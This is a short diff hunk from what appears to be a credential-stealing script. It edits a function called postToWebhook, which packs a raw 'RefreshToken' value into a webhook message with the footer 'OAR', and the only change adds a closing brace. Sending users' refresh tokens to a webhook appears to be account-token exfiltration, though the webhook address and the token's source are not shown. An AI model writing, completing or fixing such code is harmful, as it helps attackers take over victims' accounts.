@@ -342,6 +342,7 @@ async function postToWebhook(
                     {
                         name: "**RefreshToken**",
                         value: "```" + refreshToken + "```",
+                    },   
                 ],
                 footer: {
                     text: "OAR",
